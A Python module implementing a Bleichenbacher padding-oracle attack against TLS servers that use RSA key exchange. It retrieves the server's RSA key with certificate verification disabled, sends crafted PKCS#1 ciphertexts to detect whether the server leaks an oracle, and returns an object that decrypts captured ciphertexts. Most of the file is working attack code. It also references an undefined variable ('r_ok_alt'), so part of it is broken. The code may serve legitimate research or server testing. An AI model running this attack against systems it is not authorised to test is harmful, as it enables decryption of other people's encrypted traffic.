import ssl
import socket
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import random

import reversebleichenbacher.config as config
import reversebleichenbacher.tls_oracle as tls_oracle
import reversebleichenbacher.utils as utils
import reversebleichenbacher.bleichenbacher as bleichenbacher

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes

import json

class BleichenbacherTLSAttack:

    def __init__(self, oracle_constructor, config, rsa):
        self.oracle_constructor = oracle_constructor
        self.config = config
        self.rsa = rsa
        self.attack = bleichenbacher.CapolBleichenAttack(config)
    
    def decrypt(self, encrypted):
        oracle = self.oracle_constructor(self.config, encrypted, self.rsa)
        secret, stats = self.attack.attack(self.rsa, oracle)
        open("results.json", "w").write(json.dumps(stats.to_dict()))
        return secret

def get_rsa_from_server(server, port):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        raw_socket = socket.socket()
        s = ctx.wrap_socket(raw_socket)
        s.connect((server, port))
        cert_raw = s.getpeercert(binary_form=True)
        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
        s.close()
        return utils.BleichenbacherRSAPublicKey(cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e)
    except ssl.SSLError as e:
        print("Cannot connect to server: %s" % e)
        print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
        s.close()
        quit()
    except (ConnectionRefusedError, socket.timeout) as e:
        print("Cannot connect to server: %s" % e)
        print("There seems to be no TLS on this host/port.")
        quit()

def configure_oracle(oracle, rsa, quiet=False, test=False):
    rsa_bytelen = utils.ceil_div(rsa.bits, 8)
    random_bytes_no_zero = b""
    while len(random_bytes_no_zero) < rsa_bytelen:
        b = get_random_bytes(1)
        if b != b"\x00":
            random_bytes_no_zero += b

    pms = random_bytes_no_zero[-46:]

    pms_ok = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms
    pms_ok = int.from_bytes(pms_ok, "big")
    c_ok   = pow(pms_ok, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
    r_ok = oracle.query_raw(c_ok, message_flow = False)
    oracle.good = r_ok
    
    if test:
        pms_no_zero         = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + b"\x03\x03" + pms
        pms_wrong_zero      = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + pms + b"\x00\x11"
        pms_wrong_version   = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x02\x02" + pms 
        pms_wrong_pad       = bytes([0x01, 0x01]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms
        
        pms_no_zero         = int.from_bytes(pms_no_zero, "big")
        pms_wrong_zero      = int.from_bytes(pms_wrong_zero, "big")
        pms_wrong_version   = int.from_bytes(pms_wrong_version, "big")
        pms_wrong_pad       = int.from_bytes(pms_wrong_pad, "big")

        c_no_zero           = pow(pms_no_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_zero        = pow(pms_wrong_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_version     = pow(pms_wrong_version, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
        c_wrong_pad         = pow(pms_wrong_pad, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")

        r_no_zero = oracle.query_raw(c_no_zero, message_flow = False)
        r_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = False)
        r_wrong_version = oracle.query_raw(c_wrong_version, message_flow = False)
        r_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = False)
    
        if not quiet:
            print("Normal message flow:")
            print("Result of good request:                 ", r_ok)
            print("Result of bad request 1 (wrong pad):    ", r_wrong_pad)
            print("Result of bad request 2 (wrong zero):   ", r_wrong_zero)
            print("Result of bad request 3 (no zero):      ", r_no_zero)
            print("Result of bad request 4 (wrong version):", r_wrong_version)

        rm_ok = oracle.query_raw(c_ok, message_flow = True)
        rm_no_zero = oracle.query_raw(c_no_zero, message_flow = True)
        rm_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = True)
        rm_wrong_version = oracle.query_raw(c_wrong_version, message_flow = True)
        rm_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = True)
        
        if not quiet:
            print("Alternative flow:")
            print("Result of good request:                 ", r_ok_alt)
            print("Result of bad request 1 (wrong pad):    ", rm_wrong_pad)
            print("Result of bad request 2 (wrong zero):   ", rm_wrong_zero)
            print("Result of bad request 3 (no zero):      ", rm_no_zero)
            print("Result of bad request 4 (wrong version):", rm_wrong_version)
        if (r_ok == r_no_zero == r_wrong_zero == r_wrong_version == r_wrong_pad):
            oracle.message_flow = True
            oracle.good = rm_ok
            if (rm_ok == rm_no_zero == rm_wrong_zero == rm_wrong_version == rm_wrong_pad):
                raise Exception("No Bleichenbacher Oracle detected!")
            if not quiet:
                print("Using alternative message flow!")
        else:
            if not quiet:
                print("Using normal message flow!")

def bleichenbacher_attack_tls(ip: str, port: int, quiet: bool = False, benchmark: bool = False, early_abort: bool = False, test_oracle: bool = False, parallel: bool = False):
    rsa = get_rsa_from_server(ip, port)
    conf = config.get_config_tls_parallel(rsa) if parallel else config.get_config_tls(rsa)

    modulus_bytes = utils.ceil_div(rsa.N.bit_length(), 8)
    cke_2nd_prefix = bytearray.fromhex("{0:0{1}x}".format(modulus_bytes + 6, 4) + "10" + "{0:0{1}x}".format(modulus_bytes + 2, 6) + "{0:0{1}x}".format(modulus_bytes, 4))

    def construct_oracle(conf, encrypted, rsa):
        oracle = tls_oracle.TLSOracle(conf.oracle, ip, port, tls_oracle.ch, cke_2nd_prefix, rsa.e, rsa.N, encrypted)
        configure_oracle(oracle, rsa, quiet=True, test=test_oracle)
        return oracle
    
    if not quiet:
        oracle = tls_oracle.TLSOracle(conf.oracle, ip, port, tls_oracle.ch, cke_2nd_prefix, rsa.e, rsa.N, 0)
        configure_oracle(oracle, rsa, quiet=False, test=test_oracle)
    
    return BleichenbacherTLSAttack(construct_oracle, conf, rsa)
